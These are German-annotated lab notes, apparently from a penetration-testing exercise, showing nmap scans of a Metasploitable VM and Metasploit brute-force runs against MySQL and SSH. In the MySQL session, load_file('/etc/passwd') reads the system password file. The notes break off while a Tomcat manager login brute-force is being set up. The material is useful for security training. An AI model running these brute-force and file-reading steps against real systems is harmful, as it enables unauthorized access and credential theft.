@@ -1,0 +1,706 @@
+nmap zu begin:
+root@bt:~# nmap -sP 10.1.1.*
+
+Starting Nmap 6.01 ( http://nmap.org ) at 2013-11-06 10:32 EST
+Nmap scan report for 10.1.1.1
+Host is up (0.00030s latency).
+MAC Address: 00:0C:29:3A:06:77 (VMware)
+Nmap scan report for 10.1.1.130
+Host is up (0.00026s latency).
+MAC Address: 00:0C:29:39:12:B2 (VMware)
+Nmap scan report for 10.1.1.131
+Host is up.
+Nmap done: 256 IP addresses (3 hosts up) scanned in 6.91 seconds
+(10.1.1.131 ist eigene IP)
+
+namp der ubuntu:
+
+root@bt:~# nmap -O -v 10.1.1.1
+
+Starting Nmap 6.01 ( http://nmap.org ) at 2013-11-06 10:34 EST
+Initiating ARP Ping Scan at 10:34
+Scanning 10.1.1.1 [1 port]
+Completed ARP Ping Scan at 10:34, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:34
+Completed Parallel DNS resolution of 1 host. at 10:34, 0.01s elapsed
+Initiating SYN Stealth Scan at 10:34
+Scanning 10.1.1.1 [1000 ports]
+Discovered open port 80/tcp on 10.1.1.1
+Discovered open port 25/tcp on 10.1.1.1
+Discovered open port 21/tcp on 10.1.1.1
+Discovered open port 22/tcp on 10.1.1.1
+Discovered open port 110/tcp on 10.1.1.1
+Discovered open port 995/tcp on 10.1.1.1
+Discovered open port 2000/tcp on 10.1.1.1
+Completed SYN Stealth Scan at 10:34, 0.07s elapsed (1000 total ports)
+Initiating OS detection (try #1) against 10.1.1.1
+Nmap scan report for 10.1.1.1
+Host is up (0.00023s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+995/tcp  open  pop3s
+2000/tcp open  cisco-sccp
+MAC Address: 00:0C:29:3A:06:77 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:kernel:2.6
+OS details: Linux 2.6.17 - 2.6.36, Linux 2.6.19 - 2.6.35
+Uptime guess: 0.019 days (since Wed Nov  6 10:06:21 2013)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=202 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+Read data files from: /usr/local/bin/../share/nmap
+OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
+           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.366KB)
+
+
+nmap des metasploit:
+root@bt:~# nmap -O -v 10.1.1.130
+
+Starting Nmap 6.01 ( http://nmap.org ) at 2013-11-06 10:34 EST
+Initiating ARP Ping Scan at 10:34
+Scanning 10.1.1.130 [1 port]
+Completed ARP Ping Scan at 10:34, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:34
+Completed Parallel DNS resolution of 1 host. at 10:34, 0.01s elapsed
+Initiating SYN Stealth Scan at 10:34
+Scanning 10.1.1.130 [1000 ports]
+Discovered open port 139/tcp on 10.1.1.130
+Discovered open port 3306/tcp on 10.1.1.130
+Discovered open port 445/tcp on 10.1.1.130
+Discovered open port 22/tcp on 10.1.1.130
+Discovered open port 21/tcp on 10.1.1.130
+Discovered open port 23/tcp on 10.1.1.130
+Discovered open port 25/tcp on 10.1.1.130
+Discovered open port 53/tcp on 10.1.1.130
+Discovered open port 80/tcp on 10.1.1.130
+Discovered open port 5432/tcp on 10.1.1.130
+Discovered open port 8009/tcp on 10.1.1.130
+Discovered open port 8180/tcp on 10.1.1.130
+Completed SYN Stealth Scan at 10:34, 0.06s elapsed (1000 total ports)
+Initiating OS detection (try #1) against 10.1.1.130
+Nmap scan report for 10.1.1.130
+Host is up (0.00019s latency).
+Not shown: 988 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+5432/tcp open  postgresql
+8009/tcp open  ajp13
+8180/tcp open  unknown
+MAC Address: 00:0C:29:39:12:B2 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:kernel:2.6
+OS details: Linux 2.6.9 - 2.6.31
+Uptime guess: 0.010 days (since Wed Nov  6 10:20:16 2013)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=200 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+Read data files from: /usr/local/bin/../share/nmap
+OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
+           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.386KB)
+
+root@bt:~# nmap -sV 10.1.1.130
+
+Starting Nmap 6.01 ( http://nmap.org ) at 2013-11-06 10:35 EST
+Nmap scan report for 10.1.1.130
+Host is up (0.00027s latency).
+Not shown: 988 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.1
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:39:12:B2 (VMware)
+Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
+
+suche nach mysql exploits:
+msf > search mysql
+
+Matching Modules
+================
+
+   Name                                               Disclosure Date          Rank       Description
+   ----                                               ---------------          ----       -----------
+   auxiliary/admin/mysql/mysql_enum                                            normal     MySQL Enumeration Module
+   auxiliary/admin/mysql/mysql_sql                                             normal     MySQL SQL Generic Query
+   auxiliary/admin/tikiwiki/tikidblib                 2006-11-01 00:00:00 UTC  normal     TikiWiki Information Disclosure
+   auxiliary/analyze/jtr_mysql_fast                                            normal     John the Ripper MySQL Password Cracker (Fast Mode)
+   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09 00:00:00 UTC  normal     MySQL Authentication Bypass Password Dump
+   auxiliary/scanner/mysql/mysql_hashdump                                      normal     MYSQL Password Hashdump
+   auxiliary/scanner/mysql/mysql_login                                         normal     MySQL Login Utility
+   auxiliary/scanner/mysql/mysql_schemadump                                    normal     MYSQL Schema Dump
+   auxiliary/scanner/mysql/mysql_version                                       normal     MySQL Server Version Enumeration
+   auxiliary/server/capture/mysql                                              normal     Authentication Capture: MySQL
+   exploit/linux/mysql/mysql_yassl_getname            2010-01-25 00:00:00 UTC  good       MySQL yaSSL CertDecoder::GetName Buffer Overflow
+   exploit/linux/mysql/mysql_yassl_hello              2008-01-04 00:00:00 UTC  good       MySQL yaSSL SSL Hello Message Buffer Overflow
+   exploit/windows/mysql/mysql_payload                2009-01-16 00:00:00 UTC  excellent  Oracle MySQL for Microsoft Windows Payload Execution
+   exploit/windows/mysql/mysql_yassl_hello            2008-01-04 00:00:00 UTC  average    MySQL yaSSL SSL Hello Message Buffer Overflow
+   exploit/windows/mysql/scrutinizer_upload_exec      2012-07-27 00:00:00 UTC  excellent  Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
+   post/linux/gather/enum_configs                                              normal     Linux Gather Configurations
+   post/linux/gather/enum_users_history                                        normal     Linux Gather User History
+
+
+scanner verwenden:
+msf > use auxiliary/scanner/mysql/mysql_login 
+msf  auxiliary(mysql_login) > 
+
+
+
+msf  auxiliary(mysql_login) > show options
+
+Module options (auxiliary/scanner/mysql/mysql_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   true             no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             3306             yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      true             no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+
+Settings:
+msf  auxiliary(mysql_login) > set PASS_FILE /root/pass.txt
+PASS_FILE => /root/pass.txt
+msf  auxiliary(mysql_login) > set USER_FILE /root/user.txt 
+USER_FILE => /root/user.txt
+msf  auxiliary(mysql_login) > set RHOSTS 10.1.1.130
+RHOSTS => 10.1.1.130
+
+run des befehls:
+msf  auxiliary(mysql_login) > run
+
+[*] 10.1.1.130:3306 MYSQL - Found remote MySQL version 5.0.51a
+[*] 10.1.1.130:3306 MYSQL - [01/38] - Trying username:'admin' with password:''
+[*] 10.1.1.130:3306 MYSQL - [01/38] - failed to login as 'admin' with password ''
+[*] 10.1.1.130:3306 MYSQL - [02/38] - Trying username:'sqladmin' with password:''
+[*] 10.1.1.130:3306 MYSQL - [02/38] - failed to login as 'sqladmin' with password ''
+[*] 10.1.1.130:3306 MYSQL - [03/38] - Trying username:'root' with password:''
+[*] 10.1.1.130:3306 MYSQL - [03/38] - failed to login as 'root' with password ''
+[*] 10.1.1.130:3306 MYSQL - [04/38] - Trying username:'administrator' with password:''
+[*] 10.1.1.130:3306 MYSQL - [04/38] - failed to login as 'administrator' with password ''
+[*] 10.1.1.130:3306 MYSQL - [05/38] - Trying username:'its' with password:''
+[*] 10.1.1.130:3306 MYSQL - [05/38] - failed to login as 'its' with password ''
+[*] 10.1.1.130:3306 MYSQL - [06/38] - Trying username:'msfadmin' with password:''
+[*] 10.1.1.130:3306 MYSQL - [06/38] - failed to login as 'msfadmin' with password ''
+[*] 10.1.1.130:3306 MYSQL - [07/38] - Trying username:'admin' with password:'admin'
+[*] 10.1.1.130:3306 MYSQL - [07/38] - failed to login as 'admin' with password 'admin'
+[*] 10.1.1.130:3306 MYSQL - [08/38] - Trying username:'sqladmin' with password:'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [08/38] - failed to login as 'sqladmin' with password 'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [09/38] - Trying username:'root' with password:'root'
+[+] 10.1.1.130:3306 - SUCCESSFUL LOGIN 'root' : 'root'
+[*] 10.1.1.130:3306 MYSQL - [10/38] - Trying username:'administrator' with password:'administrator'
+[*] 10.1.1.130:3306 MYSQL - [10/38] - failed to login as 'administrator' with password 'administrator'
+[*] 10.1.1.130:3306 MYSQL - [11/38] - Trying username:'its' with password:'its'
+[*] 10.1.1.130:3306 MYSQL - [11/38] - failed to login as 'its' with password 'its'
+[*] 10.1.1.130:3306 MYSQL - [12/38] - Trying username:'msfadmin' with password:'msfadmin'
+[*] 10.1.1.130:3306 MYSQL - [12/38] - failed to login as 'msfadmin' with password 'msfadmin'
+[*] 10.1.1.130:3306 MYSQL - [13/38] - Trying username:'admin' with password:'password'
+[*] 10.1.1.130:3306 MYSQL - [13/38] - failed to login as 'admin' with password 'password'
+[*] 10.1.1.130:3306 MYSQL - [14/38] - Trying username:'admin' with password:'root'
+[*] 10.1.1.130:3306 MYSQL - [14/38] - failed to login as 'admin' with password 'root'
+[*] 10.1.1.130:3306 MYSQL - [15/38] - Trying username:'admin' with password:'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [15/38] - failed to login as 'admin' with password 'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [16/38] - Trying username:'admin' with password:'its'
+[*] 10.1.1.130:3306 MYSQL - [16/38] - failed to login as 'admin' with password 'its'
+[*] 10.1.1.130:3306 MYSQL - [17/38] - Trying username:'sqladmin' with password:'password'
+[*] 10.1.1.130:3306 MYSQL - [17/38] - failed to login as 'sqladmin' with password 'password'
+[*] 10.1.1.130:3306 MYSQL - [18/38] - Trying username:'sqladmin' with password:'admin'
+[*] 10.1.1.130:3306 MYSQL - [18/38] - failed to login as 'sqladmin' with password 'admin'
+[*] 10.1.1.130:3306 MYSQL - [19/38] - Trying username:'sqladmin' with password:'root'
+[*] 10.1.1.130:3306 MYSQL - [19/38] - failed to login as 'sqladmin' with password 'root'
+[*] 10.1.1.130:3306 MYSQL - [20/38] - Trying username:'sqladmin' with password:'its'
+[*] 10.1.1.130:3306 MYSQL - [20/38] - failed to login as 'sqladmin' with password 'its'
+[*] 10.1.1.130:3306 MYSQL - [21/38] - Trying username:'administrator' with password:'password'
+[*] 10.1.1.130:3306 MYSQL - [21/38] - failed to login as 'administrator' with password 'password'
+[*] 10.1.1.130:3306 MYSQL - [22/38] - Trying username:'administrator' with password:'admin'
+[*] 10.1.1.130:3306 MYSQL - [22/38] - failed to login as 'administrator' with password 'admin'
+[*] 10.1.1.130:3306 MYSQL - [23/38] - Trying username:'administrator' with password:'root'
+[*] 10.1.1.130:3306 MYSQL - [23/38] - failed to login as 'administrator' with password 'root'
+[*] 10.1.1.130:3306 MYSQL - [24/38] - Trying username:'administrator' with password:'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [24/38] - failed to login as 'administrator' with password 'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [25/38] - Trying username:'administrator' with password:'its'
+[*] 10.1.1.130:3306 MYSQL - [25/38] - failed to login as 'administrator' with password 'its'
+[*] 10.1.1.130:3306 MYSQL - [26/38] - Trying username:'its' with password:'password'
+[*] 10.1.1.130:3306 MYSQL - [26/38] - failed to login as 'its' with password 'password'
+[*] 10.1.1.130:3306 MYSQL - [27/38] - Trying username:'its' with password:'admin'
+[*] 10.1.1.130:3306 MYSQL - [27/38] - failed to login as 'its' with password 'admin'
+[*] 10.1.1.130:3306 MYSQL - [28/38] - Trying username:'its' with password:'root'
+[*] 10.1.1.130:3306 MYSQL - [28/38] - failed to login as 'its' with password 'root'
+[*] 10.1.1.130:3306 MYSQL - [29/38] - Trying username:'its' with password:'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [29/38] - failed to login as 'its' with password 'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [30/38] - Trying username:'msfadmin' with password:'password'
+[*] 10.1.1.130:3306 MYSQL - [30/38] - failed to login as 'msfadmin' with password 'password'
+[*] 10.1.1.130:3306 MYSQL - [31/38] - Trying username:'msfadmin' with password:'admin'
+[*] 10.1.1.130:3306 MYSQL - [31/38] - failed to login as 'msfadmin' with password 'admin'
+[*] 10.1.1.130:3306 MYSQL - [32/38] - Trying username:'msfadmin' with password:'root'
+[*] 10.1.1.130:3306 MYSQL - [32/38] - failed to login as 'msfadmin' with password 'root'
+[*] 10.1.1.130:3306 MYSQL - [33/38] - Trying username:'msfadmin' with password:'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [33/38] - failed to login as 'msfadmin' with password 'sqladmin'
+[*] 10.1.1.130:3306 MYSQL - [34/38] - Trying username:'msfadmin' with password:'its'
+[*] 10.1.1.130:3306 MYSQL - [34/38] - failed to login as 'msfadmin' with password 'its'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+passwd des rechners:
+mysql> SELECT load_file('/etc/passwd') from dual;
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| load_file('/etc/passwd')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+ |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+
+search nach ssh angriffen:
+
+msf > search ssh
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date          Rank       Description
+   ----                                        ---------------          ----       -----------
+   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                            normal     SSH Key Exchange Init Corruption
+   auxiliary/fuzzers/ssh/ssh_version_15                                 normal     SSH 1.5 Version Fuzzer
+   auxiliary/fuzzers/ssh/ssh_version_2                                  normal     SSH 2.0 Version Fuzzer
+   auxiliary/fuzzers/ssh/ssh_version_corrupt                            normal     SSH Version Corruption
+   auxiliary/scanner/ssh/ssh_identify_pubkeys                           normal     SSH Public Key Acceptance Scanner
+   auxiliary/scanner/ssh/ssh_login                                      normal     SSH Login Check Scanner
+   auxiliary/scanner/ssh/ssh_login_pubkey                               normal     SSH Public Key Login Scanner
+   auxiliary/scanner/ssh/ssh_version                                    normal     SSH Version Scanner
+   exploit/linux/ssh/f5_bigip_known_privkey    2012-06-11 00:00:00 UTC  excellent  F5 BIG-IP SSH Private Key Exposure
+   exploit/windows/ssh/freeftpd_key_exchange   2006-05-12 00:00:00 UTC  average    FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
+   exploit/windows/ssh/freesshd_key_exchange   2006-05-12 00:00:00 UTC  average    FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow
+   exploit/windows/ssh/putty_msg_debug         2002-12-16 00:00:00 UTC  normal     PuTTy.exe <= v0.53 Buffer Overflow
+   exploit/windows/ssh/securecrt_ssh1          2002-07-23 00:00:00 UTC  average    SecureCRT <= 4.0 Beta 2 SSH1 Buffer Overflow
+   exploit/windows/ssh/sysax_ssh_username      2012-02-27 00:00:00 UTC  normal     Sysax 5.53 SSH Username Buffer Overflow
+   post/linux/gather/enum_network                                       normal     Linux Gather Network Information
+   post/multi/gather/ssh_creds                                          normal     Multi Gather OpenSSH PKI Credentials Collection
+   post/windows/gather/credentials/mremote                              normal     Windows Gather mRemote Saved Password Extraction
+
+optionen einstellen:
+msf  auxiliary(ssh_login) > set PASS_FILE /root/pass.txt 
+PASS_FILE => /root/pass.txt
+msf  auxiliary(ssh_login) > set USER_FILE /root/user.txt 
+USER_FILE => /root/user.txt
+msf  auxiliary(ssh_login) > set RHOSTS 10.1.1.130
+RHOSTS => 10.1.1.130
+
+
+ergebnis
+msf  auxiliary(ssh_login) > run
+
+[*] 10.1.1.130:22 SSH - Starting bruteforce
+[*] 10.1.1.130:22 SSH - [01/43] - Trying: username: 'admin' with password: ''
+[-] 10.1.1.130:22 SSH - [01/43] - Failed: 'admin':''
+[*] 10.1.1.130:22 SSH - [02/43] - Trying: username: 'sqladmin' with password: ''
+[-] 10.1.1.130:22 SSH - [02/43] - Failed: 'sqladmin':''
+[*] 10.1.1.130:22 SSH - [03/43] - Trying: username: 'root' with password: ''
+[-] 10.1.1.130:22 SSH - [03/43] - Failed: 'root':''
+[*] 10.1.1.130:22 SSH - [04/43] - Trying: username: 'administrator' with password: ''
+[-] 10.1.1.130:22 SSH - [04/43] - Failed: 'administrator':''
+[*] 10.1.1.130:22 SSH - [05/43] - Trying: username: 'its' with password: ''
+[-] 10.1.1.130:22 SSH - [05/43] - Failed: 'its':''
+[*] 10.1.1.130:22 SSH - [06/43] - Trying: username: 'msfadmin' with password: ''
+[-] 10.1.1.130:22 SSH - [06/43] - Failed: 'msfadmin':''
+[*] 10.1.1.130:22 SSH - [07/43] - Trying: username: 'admin' with password: 'admin'
+[-] 10.1.1.130:22 SSH - [07/43] - Failed: 'admin':'admin'
+[*] 10.1.1.130:22 SSH - [08/43] - Trying: username: 'sqladmin' with password: 'sqladmin'
+[-] 10.1.1.130:22 SSH - [08/43] - Failed: 'sqladmin':'sqladmin'
+[*] 10.1.1.130:22 SSH - [09/43] - Trying: username: 'root' with password: 'root'
+[-] 10.1.1.130:22 SSH - [09/43] - Failed: 'root':'root'
+[*] 10.1.1.130:22 SSH - [10/43] - Trying: username: 'administrator' with password: 'administrator'
+[-] 10.1.1.130:22 SSH - [10/43] - Failed: 'administrator':'administrator'
+[*] 10.1.1.130:22 SSH - [11/43] - Trying: username: 'its' with password: 'its'
+[-] 10.1.1.130:22 SSH - [11/43] - Failed: 'its':'its'
+[*] 10.1.1.130:22 SSH - [12/43] - Trying: username: 'msfadmin' with password: 'msfadmin'
+[*] Command shell session 1 opened (10.1.1.131:36832 -> 10.1.1.130:22) at 2013-11-06 10:53:33 -0500
+[+] 10.1.1.130:22 SSH - [12/43] - Success: 'msfadmin':'msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
+[*] 10.1.1.130:22 SSH - [13/43] - Trying: username: 'admin' with password: 'password'
+[-] 10.1.1.130:22 SSH - [13/43] - Failed: 'admin':'password'
+[*] 10.1.1.130:22 SSH - [14/43] - Trying: username: 'admin' with password: 'root'
+[-] 10.1.1.130:22 SSH - [14/43] - Failed: 'admin':'root'
+[*] 10.1.1.130:22 SSH - [15/43] - Trying: username: 'admin' with password: 'sqladmin'
+[-] 10.1.1.130:22 SSH - [15/43] - Failed: 'admin':'sqladmin'
+[*] 10.1.1.130:22 SSH - [16/43] - Trying: username: 'admin' with password: 'its'
+[-] 10.1.1.130:22 SSH - [16/43] - Failed: 'admin':'its'
+[*] 10.1.1.130:22 SSH - [17/43] - Trying: username: 'admin' with password: 'msfadmin'
+[-] 10.1.1.130:22 SSH - [17/43] - Failed: 'admin':'msfadmin'
+[*] 10.1.1.130:22 SSH - [18/43] - Trying: username: 'sqladmin' with password: 'password'
+[-] 10.1.1.130:22 SSH - [18/43] - Failed: 'sqladmin':'password'
+[*] 10.1.1.130:22 SSH - [19/43] - Trying: username: 'sqladmin' with password: 'admin'
+[-] 10.1.1.130:22 SSH - [19/43] - Failed: 'sqladmin':'admin'
+[*] 10.1.1.130:22 SSH - [20/43] - Trying: username: 'sqladmin' with password: 'root'
+[-] 10.1.1.130:22 SSH - [20/43] - Failed: 'sqladmin':'root'
+[*] 10.1.1.130:22 SSH - [21/43] - Trying: username: 'sqladmin' with password: 'its'
+[-] 10.1.1.130:22 SSH - [21/43] - Failed: 'sqladmin':'its'
+[*] 10.1.1.130:22 SSH - [22/43] - Trying: username: 'sqladmin' with password: 'msfadmin'
+[-] 10.1.1.130:22 SSH - [22/43] - Failed: 'sqladmin':'msfadmin'
+[*] 10.1.1.130:22 SSH - [23/43] - Trying: username: 'root' with password: 'password'
+[-] 10.1.1.130:22 SSH - [23/43] - Failed: 'root':'password'
+[*] 10.1.1.130:22 SSH - [24/43] - Trying: username: 'root' with password: 'admin'
+[-] 10.1.1.130:22 SSH - [24/43] - Failed: 'root':'admin'
+[*] 10.1.1.130:22 SSH - [25/43] - Trying: username: 'root' with password: 'sqladmin'
+[-] 10.1.1.130:22 SSH - [25/43] - Failed: 'root':'sqladmin'
+[*] 10.1.1.130:22 SSH - [26/43] - Trying: username: 'root' with password: 'its'
+[-] 10.1.1.130:22 SSH - [26/43] - Failed: 'root':'its'
+[*] 10.1.1.130:22 SSH - [27/43] - Trying: username: 'root' with password: 'msfadmin'
+[-] 10.1.1.130:22 SSH - [27/43] - Failed: 'root':'msfadmin'
+[*] 10.1.1.130:22 SSH - [28/43] - Trying: username: 'administrator' with password: 'password'
+[-] 10.1.1.130:22 SSH - [28/43] - Failed: 'administrator':'password'
+[*] 10.1.1.130:22 SSH - [29/43] - Trying: username: 'administrator' with password: 'admin'
+[-] 10.1.1.130:22 SSH - [29/43] - Failed: 'administrator':'admin'
+[*] 10.1.1.130:22 SSH - [30/43] - Trying: username: 'administrator' with password: 'root'
+[-] 10.1.1.130:22 SSH - [30/43] - Failed: 'administrator':'root'
+[*] 10.1.1.130:22 SSH - [31/43] - Trying: username: 'administrator' with password: 'sqladmin'
+[-] 10.1.1.130:22 SSH - [31/43] - Failed: 'administrator':'sqladmin'
+[*] 10.1.1.130:22 SSH - [32/43] - Trying: username: 'administrator' with password: 'its'
+[-] 10.1.1.130:22 SSH - [32/43] - Failed: 'administrator':'its'
+[*] 10.1.1.130:22 SSH - [33/43] - Trying: username: 'administrator' with password: 'msfadmin'
+[-] 10.1.1.130:22 SSH - [33/43] - Failed: 'administrator':'msfadmin'
+[*] 10.1.1.130:22 SSH - [34/43] - Trying: username: 'its' with password: 'password'
+[-] 10.1.1.130:22 SSH - [34/43] - Failed: 'its':'password'
+[*] 10.1.1.130:22 SSH - [35/43] - Trying: username: 'its' with password: 'admin'
+[-] 10.1.1.130:22 SSH - [35/43] - Failed: 'its':'admin'
+[*] 10.1.1.130:22 SSH - [36/43] - Trying: username: 'its' with password: 'root'
+[-] 10.1.1.130:22 SSH - [36/43] - Failed: 'its':'root'
+[*] 10.1.1.130:22 SSH - [37/43] - Trying: username: 'its' with password: 'sqladmin'
+[-] 10.1.1.130:22 SSH - [37/43] - Failed: 'its':'sqladmin'
+[*] 10.1.1.130:22 SSH - [38/43] - Trying: username: 'its' with password: 'msfadmin'
+[-] 10.1.1.130:22 SSH - [38/43] - Failed: 'its':'msfadmin'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+tomcat:
+msf  auxiliary(ssh_login) > use auxiliary/scanner/http/tomcat_mgr_login 
+msf  auxiliary(tomcat_mgr_login) > 
+
+
+msf  auxiliary(tomcat_mgr_login) > set PASS_FILE /opt/metasploit/msf3/data/wordlists/tomcat_mgr_default_pass.txt 
+PASS_FILE => /opt/metasploit/msf3/data/wordlists/tomcat_mgr_default_pass.txt
+msf  auxiliary(tomcat_mgr_login) > set USER_FILE /opt/metasploit/msf3/data/wordlists/t
+tftp.txt                        tomcat_mgr_default_userpass.txt 
+tomcat_mgr_default_pass.txt     tomcat_mgr_default_users.txt    
